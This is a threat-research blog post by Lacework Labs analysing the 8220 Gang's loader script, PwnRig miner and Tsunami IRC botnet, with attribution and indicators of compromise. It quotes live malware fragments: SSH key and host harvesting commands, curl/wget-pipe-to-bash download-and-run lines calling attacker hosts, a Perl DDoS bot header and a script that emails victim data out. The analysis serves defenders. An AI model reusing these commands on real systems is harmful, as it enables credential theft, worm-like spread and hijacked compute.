# Reference for threat actor for "8220 Gang"

**Title**: 8220 Gangs Recent use of Custom Miner and Botnet

**Source**: https://www.lacework.com/blog/8220-gangs-recent-use-of-custom-miner-and-botnet/

## Content
8220 Gangs Recent use of Custom Miner and BotnetCompanyAbout UsLeadershipPartnersStrategic AlliancesInvestorsCareersEventsContactLoginEnglishFrançaisDeutschWhy LaceworkPlatformPlatform OverviewA unified cloud security platform that connects the dots for you.capabilitiesenvironments technologyBackcapabilitiesCode SecurityCode SecurityQuickly prioritize and fix first and third-party code risksInfrastructure as Code Security (IaC)Fix misconfigurations before code is deployedSoftware Composition Analysis (SCA)Detect third-party software risks and build SBOMsStatic Application Security Testing (SAST)Find security weaknesses in your in-house codeCloud SecurityCloud-Native Application Protection Platform (CNAPP)Secure across the entire application lifecycleCloud Workload Protection Platform (CWPP)Monitor workloads continuously for threatsCloud Infrastructure Entitlement Management (CIEM)Reduce cloud identity security risksCloud Security Posture Management (CSPM)Assess and prioritize vulnerabilities and other risksKubernetes Security (K8s)Find risks and threats in your K8s clustersData Security Posture Management (DSPM)Smarter data protection for enterprisesBackenvironments Amazon Web Services (AWS)Simplify security for Amazon Web ServicesMicrosoft AzureContinuously secure Microsoft Azure appsGoogle CloudAutomate security for Google CloudMulticloudProtection across multicloud and hybridOracle Cloud Infrastructure (OCI)Minimize security risks in Oracle CloudBacktechnologyPolygraph®: Behavioral Analytics Engine Automatically find and know your normal with our patented machine-learning technologyData Ingestion  See more with combined agentless and agent-based approachIntegrationsSupercharge productivity by integrating with your existing workflowsAttack path analysis (APA)Map attack paths and spot active intrudersLacework AI AssistLeverage ML/AI capabilities to conduct deep analysis of cloud and security eventsSolutionsSolutions OverviewCloud security solutions for teams to build more securely and unlock business outcomes through faster innovation.use casesindustry & sizeuser roleBackuse casesVulnerability ManagementFind and fix vulnerabilities in build time and runtimeContainer Security Visibility into complex host and container activityRisk PrioritizationCut alert noise with better cloud contextCloud ComplianceStreamline audits to meet industry standards Threat ManagementDetect known and unknown cloud threats fasterOperational EfficiencyWork smarter with your existing teamCode SecurityQuickly prioritize and fix first and third-party code risksBackindustry & sizeFinancial Services and FinTechPrevent cybercrime with safe financial transactionsCloud Security for EnterpriseGain automated code-to-cloud security at scaleHealthcare and HealthTechProtect healthcare data and demonstrate HIPAA complianceCloud Security for StartupsAutomate processes to accelerate small business growthGamingSecure player data while speeding game developmentBackuser roleSecurityPinpoint cloud issues, with rich context to act fastDeveloperBuild faster with continuous security and deep visibilityCustomersCustomers OverviewLacework is trusted by the most innovative companies across the globe.Customer SuccessBackCustomer SuccessCase StudiesTraining: Lacework AcademyLacework CommunityProduct DocumentationCustomer SupportBackCustomer SupportCustomer CenterSupportLoginContact UsResourcesResources OverviewLearn about Lacework’s modern approach to cloud security with Blogs, Case Studies, Videos, eBooks, Webinars, and White Papers.Resources & InsightsBackResources & InsightsBlogCase StudiesIndustry ReportsInfographicsSolution BriefsVideoseBooksWhite PapersWebinarsCode to Cloud PodcastSecurity Job BoardCloud Security FundamentalsTraining & DocsBackTraining & DocsLacework AcademyLacework CommunityDocumentationCompanyBackCompanyAbout UsLeadershipPartnersStrategic AlliancesInvestorsCareersEventsContactENDEFRWatch DemoLogin






Blog

8220 Gangs Recent use of Custom Miner and Botnet



                                Lacework Labs                            


May 20, 2021


  14 min read
                                                
Research





































Work Email*











I agree to receiving Lacework emails for products, resources, events, & offers. See Privacy Policy.



            Watch now            






By submitting this form, you agree to our privacy policy.



 

 Jared Stroud, Chris Hall, and Tom Hegel
Cloud Security Researchers – Lacework Labs 
Lacework Labs has recently encountered a cluster of malicious activity based around loader scripts, and delivery of a custom cryptocurrency miner and an IRC bot. Specifically, we’ve identified a new loader script, a custom “PwnRig” miner, and unique Tsunami IRC botnet variants. Additionally, this blog shares insight into noteworthy infrastructure and attribution findings. The specific cluster of activity has been in use since 2019. Lacework Labs assesses with moderate confidence this activity is associated with the crimeware group most commonly known as the 8220 Gang, who have been operating since at least 2017. This blog includes an analysis of the loader, miner, and unique IRC botnet variants. Additionally, this blog shares insight into noteworthy infrastructure and attribution findings. All IOCs can be found in the Indicators of compromise table at the end of this blog, and on the Lacework Labs GitHub. Please follow @LaceworkLabs Twitter to keep up with our latest research.
 
Key Points
 

A new cluster of activity links the 8220 Gang to a campaign of infecting hosts, primarily through common cloud services, with a custom miner and IRC bot for further attacks and remote control.
PwnRig, a custom XMRig-based miner variant, attempts to conceal its configuration details and makes use of a mining proxy to prevent the public from monitoring its pool details. We’re providing a dump of all samples, their build IDs, associated C2 server(s), and mining wallets.
The modified IRC, Tsunami-based, bot is also installed on victim machines. We’re providing a dump of the illicit miner samples, their configured C2 server(s), in addition to the IRC channel configured for automated botnet access.

 
Loader Infection Process
The infection process for this activity is very similar to other common loaders that we’ve reported on in the past, making use of commonly reused functions. The overall objective is to prepare the victim host for infection, download and execute proper versions of PwnRig miner and the Tsunami IRC bot, gain persistence, attempt lateral movement, and clean up forensic artifacts. This infection is done through a loader shell script, likely delivered through various n-day exploits for popular services such as Redis and Apache. All actions are automated based on the script execution and are likely opportunistically run. A look at a recent sample (D646f450ec5b2e1e04c962350fa430b9651fbcb33a8c39571126e49d6edb5cf1) shows various noteworthy design characteristics. Various embedded scripts are included through the base64 encoded data set as a variable in the primary loader, as can be seen in the cron modifications for persistence at line 140.

Figure 1. Base64 Encoded Script Example 
Additionally, the localgo function execution for lateral movement collects the following information for use:
 
KEYS:
 

~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub
~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile"

~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' 
~/ /root /home -maxdepth 3 -name '*.pem

HOSTS:

~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" 
~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' 
/etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk
~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)

USERS:

find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -wv ".ssh"
cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)

 
The function will then iterate through each user/host/key attempting to SSH into accessible hosts for download and installation of http://$url/xms, which in this case would kick off this same infection to new hosts. The script will “Wait 5 seconds after every 20 attempts and clean up hanging processes”, as noted by the comment. Another interesting functionality is confirmation that the Tsunami IRC bot has been installed by checking for the files MD5 hash (dc3d2e17df6cef8df41ce8b0eba99291) in /tmp. This would instruct the victim host to download the sample if the file exists with a different hash, or does not exist at all. A common trend with this actor is the lack of code cleanliness. Repeatedly there is functionality left in scripts which are outdated or just not called during any path of execution. For example, previously used code for older campaigns/samples are commented out and never called:
 

#			echo "xd" &amp;gt; /tmp/.checking
#			$WGET "$DIR"/masscan http://209[.]141[.]40[.]190/masscan
#			$WGET "$DIR"/p http://209[.]141[.]40[.]190/ps
#			$WGET "$DIR"/hxx http://209[.]141[.]40[.]190/hxx
#			lwp-download http://209[.]141[.]40[.]190/masscan "$DIR"/masscan
#			lwp-download http://209[.]141[.]40[.]190/ps "$DIR"/ps
#			lwp-download http://209[.]141[.]40[.]190/hxx "$DIR"/hxx
#			chmod 777 "$DIR"/hxx
#			chmod 777 "$DIR"/masscan
#			rm -rf /tmp/sshcheck /tmp/ssh_vuln.txt /tmp/scan.log /tmp/ipss
#			nohup /tmp/masscan 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 --max-rate 600000 -p22 --wait 0 | awk '{print $6}' &amp;gt; /tmp/ipss
#			#nohup /tmp/scan $rand.$rand2.0.0-$rand.$rand2.255.255 22 &amp;gt; /tmp/ssh_vuln.txt
#			#cat /tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf &amp;gt; /tmp/sshcheck
#			nohup /tmp/hxx 300 -f /tmp/ipss /tmp/ps 22 'curl -s http://209[.]141[.]40[.]190/xms | bash -sh; wget -q -O - http://209[.]141[.]40[.]190/xms | bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9kLnB5IikucmVhZCgpKSc= | base64 -d | bash -; lwp-download http://209[.]141[.]40[.]190/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms' &amp;gt; /dev/null 2&amp;amp;&amp;gt;1
#			echo Finished
#			pkill -9 hxx

 
Similar findings can be observed in the PwnRig analysis as well.
 
PwnRig
The actor responsible for this malicious activity uses a custom version of XMRig they’ve deemed “PwnRig” based on an identified build string. PwnRig extends XMRig with custom functionality surrounding the execution of the binary. Executing the PwnRig binary with the -v command line argument revealed the build date along with the libraries it was built against.
 

Figure 2. PwnRig Build Info 
Based on analysis from Lacework Labs of various samples, we assess that PwnRig has been in development since at least December of 2019, and is also deployed with other names such as “Java (Update)”. While other Cryptojacking payloads typically use a separate binary to spawn a Cryptocurrency miner under a nondescript name, PwnRig handles this functionality and more in one single binary. The Lacework Labs team discovered custom commands and associated command line arguments within PwnRig. Identified within PwnRig was a disclaimer prior to the custom command line arguments.
 

Figure 3. PwnRigs professional sharing requirements 
These hard coded command line flags were discovered through statically reversing the PwnRig binary as well as dumping the memory of the running process. The table below breaks out the command line argument and the associated comment from the binary. Some of the functionality in the table below also maps to the XMRig command line arguments.
 
 
Command Line ArgumentComment within pwnRig-dMine with static IP for nondns resolver server -vCheck the current version of miner and build info.-tManually set your thread/processor to mine. -dpIs same like -d and -p-pfCustom PID file to bypass run-once-lf Log file to save the stats -wiMine with customized worker ID-tlsTo enable ssl support & bypass the firewall-arg“To use miner with any custom argument”-kMine without releasing CPU load by heavy process-waWallet address-cRun miner without cronjob by default is auto cron-cfMine with custom json file-gbMine with 1gb huge pages enabled-rRun miner forcefully by default its run-once mode-fRun in the foreground mode to see the stats/hashes-hCustom fake process-hpMine without enabling the huge pages-pCustom port for pool/proxy-paSpecify pool_url:port-ipTo mine for lan only ipv4 allowed-dlGib to donate to dev-lanUsed to point miner for lan bcoz the pool ip is hard-coded in bin so for lan server you can use those only few classes
 

Figure 4. PwnRig Commands

Figure 5. PwnRig commands cont
 
 
Executing PwnRig with the -h argument allows for the Cryptocurrency miner to be called whatever the end-user desires as long as the name does not exceed seven characters. The command line argument string indicates that the default process name would be ssh. However, during analysis of this binary and variants process names have varied from dbused, to python, and several others. The persistence of this binary is achieved via a crontab entry, which can be disabled if the binary is executed with a -c flag. A cron entry is created for the current working directory of the PwnRig binary to attempt to execute every minute. Due to a file locking mechanism implemented by PwnRig, only one variant runs at once. At the bottom of the command line arguments is a signature indicating that these modifications were made by “xXx”. Signatures from pwnRig were also observed in other samples. In the corresponding Tsunami IRC botnet channels and passwords used include “xXx”.
 
 

Figure 6. PwnRig Signature
 
 
Foreground Execution: Fake Arguments
Through leveraging the -f foreground option and executing PwnRig, the standard interface one would expect with XMRig is observed. However, without providing command line options beyond -f, DNS queries are fired off to either fbi.com or fbi.org depending on the PwnRig release.
 

Figure 7. FBI DNS Attempts 
Lacework Labs assesses this may be an effort of misdirection, as hardcoded strings within the binary indicate that this is a “fake pool”. In the event DNS did not resolve, the IP that is used is 127.0.0.1. This fake pool was only observed being queried when PwnRig was being run in the foreground. Executing PwnRig without command line options caused it to spawn as a hard coded value. In the case of this sample that value is “dbused”.
 

Figure 8. PwnRig FBI Request 
Throughout other scripts associated with PwnRig, the fbi.com string has been repeatedly leveraged. For example, the encoded script (5f34168868107b31a3d31b071b71c6a7ffbf2ef48e0dac27c53115bc180dd029) placed within the dd.py script (558c12a703cac54a1a1206d80b12203d323b869e486a18c4340a09ff0a482570) which is executed through the initial loader infection process, includes a reference to the FBI.

key2="(curl -fsSL $url/xms||wget -q -O- $url/xms||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$url/xms\").read()')| bash -sh; lwp-download $url/xms $DIR/xms; bash $DIR/xms; $DIR/xms; rm -rf $DIR/xms"

Encrypted Section
During analysis of illicit miners or related files it’s common to identify a configuration file (typically config.json) that contains the information relevant to the actual mining operations. This file contains the username, password, and various other information prevalent for the mining pool. During dynamic execution of PwnRig there was no obvious indication of a configuration file being written to disk or command line arguments being passed to the mining portion of the malware. When statically analyzing the PwnRig binary, a section of code with high entropy was discovered. References to this code had indications of OpenSSL libraries being used as well as AES functions. The Lacework Labs team assesses this section of the binary contains the configuration file.
 

Figure 9. High entropy section of PwnRig 
Rather than attempt to statically recover the cryptographic keys and IVs appropriate for decrypting this section of code, the Lacework Labs team dumped the memory of the running process to recover the configuration data. This memory dump was then loaded into Ghidra and the command line arguments associated with XMRig were identified and can be seen in the image below.
 

Figure 10. Command Line Arguments 
Perhaps the most interesting piece revealed through the command line arguments is the usage in an April 2021 sample of PwnRig was the usage of the --pass argument. Instead of being a password for the mining pool, the --pass command line argument is composed of the host IP address, username, hostname, number of processors and release of the CPU. The below table outlines a summary of associated PwnRig configurations.

Mining Proxy
In addition to the effort of concealing the PwnRig configuration setting, the actor also makes use of their own C2 servers as pool mining proxies. The adversary instructs their miners to list the mining pool as their own C2 server, and manage the public pool configuration in private from the server side. This ultimately prevents us from performing a lookup of their pool profile to inspect victim quantity, mining income, and other useful information. This is an interesting technique as it is not heavily observed in the majority of commodity cryptojacking campaigns. One recent mining proxy has been c4k-rx0.pwndns.pw, which can be easily noted by navigating to in the browser.
 

Figure 11. Mining Proxy status in browser 
Tsunami
The Tsunami IRC bot is a popular choice for cloud based botnets as it provides a wealth of functionality and allows the attacker to issue commands within an IRC server. Variations of this bot exist and have names such as Katien, ZiggyStratux, Knight and others. The image below shows the help command and associated functionality with this bot.

Figure 12. Tsunami functionality 
The Lacework Labs team identified small modifications to the source code of this particular variant that included a lock file of .python within the /tmp/ directory. This file prevents the execution of more than one bot at the same time. Additionally the configuration section of this Tsunami variant has three separate servers for failover with a username of ircbot456@ being used to join channel #.br with a random username of capital letters.
 

Figure 13. Tsunami IRC servers 
The following Tsunami variants linked to the domains used in this campaign, and their associated configurations have been detailed in the table below.

Pwndns was registered in March of 2019, however do-dear was first registered in 2012 and has been updated several times since. While the domain’s whois information is currently private, historical whois data shows Pakistani addresses as well.
 

Whois
Updated


Registrant Contact Details:
Do-Dear
Obaid Ullah        (approvehost@gmail.com)
North Karachi
Karachi
Sind(en),19200
PK
Tel. +92.3472453023

17-Nov-2012



Registry Registrant ID:
Registrant Name: mIRc-KinG Quinine
Registrant Organization:
Registrant Street: Tokyo
Registrant City: Karachi
Registrant State/Province: Sindh
Registrant Postal Code: 00786
Registrant Country: pk
Registrant Phone: +92.090078601
Registrant Phone Ext:
Registrant Fax:
Registrant Fax Ext:
Registrant Email: angel_bhf@hotmail.com
Registry Admin ID:

2013-12-24

do-dear is an IRC chat that has been in operation since as early as 2014.

Administrative info about chat.do-dear.com NickName: p3rL
Email-Id: p3rL[at]Do-Dear.com Facebook:
http://www.facebook.com/Fir0wN


There are at least two channels on the do-dear IRC, #dodear which is an open channel. All of the users in the channel appear to be Pakistani and send messages in Urdu. The other channel is #mk has been used for DDOS botnet operations since at least early 2019.The first observed malware associated with this channel is a perl irc bot.


$process = "-sh";
$vers = "\001VERSION 8,1-=-11[4mIRc-KinG11]8-=-0,1 | 11,1DDoS Bots.\001";
$nick = getnick();
$ircname = "DDoS";
$realname = "4-=-2D12DoS4-=-";
sub getnick {
  return "DDoS".int(rand(1000));
}
$server = 'irc.undernet.org' unless $server;
my $port = '6667';
my $linas_max='8';
my $sleep='5';
my $homedir = "/tmp/";
my $version = '1,11D11,1DoS Bot Powerd By mIRc-Kin1,11G';
my @admins = ("p3rL");
my @hostauth = ("SeR");
my @chans = ("#mk");
my $pacotes = 1;
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use Socket;
use IO::Socket;
use IO::Socket::INET;
use IO::Select;
chdir("$homedir");
$server="$ARGV[0]" if $ARGV[0];
$0


The admin for this channel uses the handle p3rl
 

Figure 14. IRC Profile 
The P3rl persona also appears in a bash file that has been served off of both pw.pwndns.pw and web.do-dear.com starting in June 2020 (cpw.pwndns.pw/reboot.sh, web.do-dear.com/reboot.sh). This script first connects to 66.171.248.178 (whatsmyipaddress.com) and 208.95.112.1 (ip-api.com) to pull information about the victim server. This information is then parsed and sent in email to the following emails:
pwndns@protonmail.com
pwndns.pw@protonmail.com



echo "Subject: Server Information @ Reboot" &amp;gt; mail.txt
echo "►=====================INFO SCRIPT BY p3rL=========================◄" &amp;gt;&amp;gt; mail.txt
echo "[₪]► IP                    › $IP" &amp;gt;&amp;gt; mail.txt
echo "[₪]► USER                  › $USER" &amp;gt;&amp;gt; mail.txt
echo "[₪]► COUNTRY               › $COUNTRY" &amp;gt;&amp;gt; mail.txt
echo "[₪]► ORG                   › $ORG" &amp;gt;&amp;gt; mail.txt
echo "[₪]► ROOT                  › $ROOT" &amp;gt;&amp;gt; mail.txt
echo "[₪]► GPU                   › $GPU" &amp;gt;&amp;gt; mail.txt
echo "[₪]► OS                    › $OS" &amp;gt;&amp;gt; mail.txt
echo "[₪]► RAM                   › $RAM" &amp;gt;&amp;gt; mail.txt
echo "[₪]► DISK                  › $DISK" &amp;gt;&amp;gt; mail.txt
echo "[₪]► MODEL                 › $MODEL" &amp;gt;&amp;gt; mail.txt
echo "[₪]► PROCESSORS            › $PROCS" &amp;gt;&amp;gt; mail.txt
echo "[₪]► STEPPING              › $STEP" &amp;gt;&amp;gt; mail.txt
echo "[₪]► BOGOMIPS              › $BOGO" &amp;gt;&amp;gt; mail.txt
echo "[₪]► UPTIME                › Days &amp;gt; $DAYS | Hours &amp;gt; $HRS | Minutes &amp;gt; $MINS" &amp;gt;&amp;gt; mail.txt
echo "[₪]► UNAME                 › $VER" &amp;gt;&amp;gt; mail.txt

sendmail "pwndns@protonmail.com,pwndns.pw@protonmail.com" &amp;lt; mail.txt 2&amp;gt;/dev/null
sed -i '1d' mail.txt
mail -s "Server Information @ Reboot" "pwndns@protonmail.com,pwndns.pw@protonmail.com" &amp;lt; mail.txt 2&amp;gt;/dev/null
rm -rf mail.txt

In addition to pwndns and do-dear, there are other clusters of infrastructure in use throughout the various samples, such as Tsunami beacons to 104.244.75.25, which can also link to a collection of other malicious activity reported by Tencent. This pivot can be made with confidence based on code similarity, infrastructure overlap, and again wallet reuse. This blog will not dive into the extent of this pivot, but it expands into Windows targeting, Powershell scripts, and other associated adversary attack techniques.
Targeting and Victims
Lacework Labs is unable to determine the complete list of targeting methods used by this actor, however we assess with moderate confidence that it continues to be exploitation of n-day vulnerabilities for Apache Struts, Redis, Docker, Hadoop, WebLogic, JBoss, and other commonly public facing services. As noted from the findings during an infrastructure analysis, targeting includes Windows and Linux operating systems. We estimate that victim quantities range from 1500 to 2000 hosts recently. Again, we’re unable to verify mining worker quantities due to the proxy use, however a roughly 2000 worker botnet could gain noteworthy mining income for a crimeware group. Cisco Umbrella shows the tell-tale signs of what are likely automated victim DNS beacons based on their telemetry.
 

Figure 15. DNS activity – Cisco Umbrella 
Geolocation data from Cisco Umbrella shows the majority of queries originating from India, Iran, Brazil, and China.
 

Figure 16. DNS location of sources – Cisco Umbrella 
Previous campaigns made use of an IP list to filter out potential victims. A script named update.sh would first check the victim’s external IP address and compare it to the IPs in the list. If there is a match, then the Tsunami variant is installed, otherwise the PwnRig miner would be. The use of an IP filter is not a common tactic and displays a more targeted approach in operations. The same list appears to have been used for close to a year and consists of 8458 entries. The following chart is a breakdown of target IP ASNs in this filter. It’s worth noting that passive DNS analysis of attacker infrastructure revealed much overlap in the same ASNs. This filtering gives a sense for target types based on their public IP.
 

Figure 17. Target IP IP Filter by ASN 
Attribution
On the surface, the attackers infrastructure and related activity appears to have a Pakistani opportunistic relationship by way of the do-dear.com domain use. However Lacework Labs assesses with moderate confidence the attacker is associated with the 8220 Gang / 8220 Mining Group based on similarities to past confirmed activity, reuse of cryptocurrency wallets, and reuse of previously linked infrastructure. The exact relationship between these 8220 and do-dear’s heavy Urdu speaking user base remains unclear. Some samples associated with the 8220 Gang activity were first uploaded to VirusTotal containing a file path named after Chinese forensics firm Shen Zhou Wang Yun Information Technology Co., Ltd. The below table shows malware submissions related to this activity. It’s important to highlight, this upload path can also be associated with previous reporting of HiddenWasp and Muhstik. It continues to remain unknown if the uploaders are truly the forensics firm (misdirection) and how they gained access to such files before known in the wild activity (legitimate detection / development involvement).


Upload path
First submission date
Notes


/home/wys/shenzhouwangyun/shell/downloadFile/pw.pwndns.pw_root.sh
2019-05-06
Submitted once - zero detection


/home/wys/shenzhouwangyun/shell/downloadFile/web.do-dear.com_root.sh
2018-11-18
Multiple submissions - zero detection


/home/wys/shenzhouwangyun/shell/downloadFile/web.do-dear.com_update.sh
2018-11-11
Multiple submissions - zero detection



Indicators of Compromise
All IOCs can be found in the Indicators of compromise table at the end of this blog, and on the Lacework Labs GitHub.

First ObservedTypeIOC2021-05-04Hash653e638e6e38636b0f14ce233661947f624011ef36f7c7edbc8a7614248c3fce2021-05-03Hash558c12a703cac54a1a1206d80b12203d323b869e486a18c4340a09ff0a4825702021-05-03hash5f34168868107b31a3d31b071b71c6a7ffbf2ef48e0dac27c53115bc180dd0292021-05-02HashD646f450ec5b2e1e04c962350fa430b9651fbcb33a8c39571126e49d6edb5cf12021-05-01Hash5c53106aea7977870296385f8c5416f44613c5c2798783045ed102f678e9a4d22021-05-01Hash7ba7feeb051400c499146105cdd6c7f3f2121d5cb7ca5d129f1f33b9476e2e822021-04-21HashBc79c734cb4378e1d13e429b6237fcee52a1261a396219add751462d0a1ae1b02021-04-17Hash4834fe47e8a44b1f6848c7f900d46731cea700e62c6058e21ece549f931f5e922021-04-16Hashec736e81116460aefea7c435ed40586ef32776ea4f38eeaaf00bb3522221c4292021-04-08Hashaed6a2514b60343be59c5c0e0f41a98f90f8f088bd0578a6d3461d08794e5b7f2021-04-08Hash7777452678cd077684b4766ad11df7241e9b5a486a542165e7b8fde117c8f8672021-04-08Hash9de9e5f5da73414c38c21ef61ef34e76ba045e595332de80925ecc1da7fa53712021-04-08Hashe44bc75e032ff2a145536d0f8b418a09c1729e8c64d3ea71ec2e7b82243169442021-03-11Hashc7b3bd1be64138446e8767dc613d60cf12f63d5fd56b70abce4a005dc8c9a4872021-02-27Hash9008b54808a320ef08be0d461bd054d759395e90d088c2f86f545fe053674cff2021-02-24Hashb6724054f83c153fe12d5fe83c0415ba855f6d1c6008ee46866e6081b65ea9b02021-02-24Hash5adb80a525277ca86166ba8024628a12b53fe403594597ddeee46956bc1003bb2021-02-20Hash13a39b14a50e6491bf1c95d92a2336707ee7ad7e6394d8fe48eed4bd91e6d1782021-02-20Hashbfac26ab02610df8fcd5715afdf8f6bfb0aad82206ea24bad6d6c7fc359f83b92021-02-06Hash4809d9eeb0c9ff1b8ecb557dca4b50acfa02d1dbf308346338666a05b6a29c572021-02-06Hash9dacd40e5b15ca1d7e6ac5b9f4def6f6f76974ae9162735015b347c1ec30c9702021-02-06Hash55f531a83e86b816ad4c7799dee3ec1edc159783c50644c22a7bc4169271de812021-02-01Wallet4B3M8rccB8hANDU91SyRdW9pL9PiDb1nyj8ZLZTriSNGVpUViwNQuHaepy6QzDvvvwdLzb2zHtRyAaznc3vmbQPHDvL7bZB2021-02-05Hashf4c91e9e1b3b57acfb5a5bc351cfdb708b9ea31b5a388b020d2d81bd1170a1b52021-02-01Hashecd0b141d5a75eb8fc0ce9044e32929497af006a6b31c7c37ef848e4d8f1065b2021-01-26Wallet46owoYY3C1X7CaYKctwZSdL2xq73sh3RHTi55ULSo3EuNgWay2eDhop9dy1JuH59v7JPHH5tdi4WYAgCdNQQ3ksDHppLmPb2021-01-26Wallet4Amn3rc3QyHLQmrCJRDdRiSmAKwkS9db2HneFe18RHHMSnLquHaz6mxU4XgDiLv9MgJ1spAi5RPtPj5iaEx3YaR3KT846kg2020-01-23Hash7dbf48cf92ec0c952285b4e45d2258ef03efab739a823d870bade1ff81af78522021-01-23Hash6624668673895260d2dc0f3790ac93f34c00fd9bd01799e49e4619a3a181fd3b2021-01-23Hasha11fef817f6af66bf4a03588b893455c3f57d6d9849ea6a6eaf351f2827c69f82020-01-19Wallet4Am4XXTGm5oAZQ7ZsoPGMKafWrzwUhWadUTQCxepMNGHR59KVPfv1K41RMN1fYYjVS3hUjibPWrXFCktjdii9BMtRoyeXWK2020-01-19Hash057f4776bcf123b623e68083e667f98c52b850dd157a0c81e8627d9dbe93757a2021-01-11Hashfe07ce19aeedc4788e84eee76a24d0e261b2252a75785fe5abe9b9c22f96fe1c2020-12-28Hashb7ecdc2cdecb1277bb26e2774b9134282ea437328517079bfd24fdf3087cb0592020-12-28Hash341cac8daf530936cd50677b165e1f08650d136dbdac2ae7637b3d0d3e462a4e2020-12-28Hash297c7497e9a69a16cab18f64c47c2b64cce3f48ae51bfa11c3f150b695f6ae052020-12-17Wallet46iM99N18KTNafBX6X2KMP6GkmBSwLpHKfuNSuLuBvFaVNd776wvp7jC1TMiP7t5HL2Bs2ngF1UND6rcEnkwRAsA9nhJ4KH2020-12-02Wallet46xipGaoGayFaqb6NR7u7Yi1SyHPuNWp2aNRGGsq53423HZGDT2hqcdDV9t9RhzftxJccxezn4BTYAj84X9pHCwLRMTxBF42020-10-08Domaingivemexyz.in2020-09-17Domaingivemexyz.xyz2020-08-17Hash35e45d556443c8bf4498d8968ab2a79e751fc2d359bf9f6b4dfd86d417f17cfb2020-08-16Hashfdc7920b09290b8dedc84c82883b7a1105c2fbad75e42aea4dc165de8e1796e32020-08-16Hash19cfe31e696d3d9f6633fa363c365ec24d687c933f36cb8d300f29af6e7e3ee92020-08-08Hash51654c52e574fd4ebda83c107bedeb0965d34581d4fc095bbb063ecefef082212020-08-08IP205.185.113.1512020-06-24Hash29316f604f3c0994e8733ea43da8e0e81a559160f5c502fecbb15a71491faf642020-04-25Hash9b8280f5ce25f1db676db6e79c60c07e61996b2b68efa6d53e017f34cbf9a8722020-04-25Hash855557e415b485cedb9dc2c6f96d524143108aff2f84497528a8fcddf2dc86a22020-04-24Hash831fdc9efbb3c07eb6383ce1756eee0ad10559ff4caf9ea5603e3e5b35517bbb2020-04-18Wallet453eYj5FmHS83Sj2fTC1eHL5PLVdoHNZT4aFk5V7B4gxUUg2MxaLedHHHTabiRLC5tMiJN5wV5wg6MJJX1Xv56Lz9qG9h5i2020-04-14Hashb59de11bbf619388092169cab7bbb17419afa7c24c6a0f29f20ba44b4251a9e82020-04-10Hashcf256a461a1b50ed2396a4dc0480d7decf9e721ae27a409fe7398a5458e6beb32020-04-01Hashbcf428c32f70defebc9c68f9eab5efbc246b592af349493cf86bfd45e81ab1c72020-03-30Domainthegov.win2020-03-09Hash3e4e520ad13d4dd8fca8f3bd6fe182a6a48ad5425f0c8b0f0fa55ac9883b86f02020-02-21Wallet46VfQmxKRmjSsMRYux3r6qJvxwdVCmZfUFkPqt1uUfikSSy2wJFbcDzdX2ZuH4hDzs7xS8Nsy5orNTMtQUJADuavC2vV1Rp2020-02-06IP Address104.244.75.252020-01-18Domainwinscp.top2020-01-14IP address107.189.11.1702019-12-20Hasha17de1d2e66d1cf8a7378dcd6ae60134f47c49ceaa39fc9cd73e5e8315a982c62019-12-20Domainpwndns.pw2019-12-13IP Address23.94.24.122019-12-13Hash – PE496e78c7a21f2aff824c664008cffdd441d49574b4db078c48f88d756d3e75e82019-05-17hash8476558d8904f14e4259a16ee08abc84c1fd4babc0f001976189b9fa9dd677642019-03-14Hostnameirc.do-dear.com2019-01-01Hash70da3ea8cc6a8542f50c4979e6a434ace2e1f1f23d242bfddb2aeba668d78c712018-09-19Wallet46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ

 

            




                    



Suggested for you






Blog
February 21, 2023
Find big threats in small signals with new composite alerts
                Read Blog        







Blog
March 30, 2023
Secured by Women: Meet the five recipients making cybersecurity history
                Read Blog        







Blog
February 12, 2024
Why we built it: A Q&A with Security Engineer Ibrahim
                Read Blog        

 










ExplorePlatform
Solutions
Polygraph
Threat Detection
Vulnerability Management
Container Security
Multicloud
Cloud Security Posture and Compliance
Pricing
CompanyAbout Us
Investors
Awards
Events
Press Releases
Media Library
Lacework Labs
Legal
Security & Privacy
Trust
Cookie Settings
LearnBlog
Resources
Lacework Academy
Lacework Community
Documentation
Cloud Security Fundamentals
SupportSupport
Status
Login
 


Contact Us
To request a demo or chat with the sales team:
Contact Us
































© 2024, Lacework,  All Rights Reserved.

Privacy Policy
Terms of Use
 


